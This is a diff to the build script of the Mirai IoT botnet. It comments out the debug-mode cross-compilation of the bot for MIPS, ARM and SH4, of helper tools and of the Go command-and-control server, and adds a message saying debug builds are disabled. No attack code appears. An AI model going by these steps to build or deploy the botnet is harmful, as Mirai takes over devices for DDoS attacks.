@@ -48,16 +48,17 @@ elif [ "$1" == "release" ]; then
 
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
-    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
-    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
-    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
-    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
-    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
-    gcc -std=c99 tools/enc.c -g -o debug/enc
-    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
-    gcc -std=c99 tools/badbot.c -g -o debug/badbot
-    go build -o debug/cnc cnc/*.go
-    go build -o debug/scanListen tools/scanListen.go
+    echo "Please note that we have made it impossible to compile with debugging. If you want to compile with debugging, please remove #."
+    #gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+    #mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
+    #armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
+    #armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
+    #sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
+    #gcc -std=c99 tools/enc.c -g -o debug/enc
+    #gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
+    #gcc -std=c99 tools/badbot.c -g -o debug/badbot
+    #go build -o debug/cnc cnc/*.go
+    #go build -o debug/scanListen tools/scanListen.go
 else
     echo "Unknown parameter $1: $0 <debug | release>"
 fi
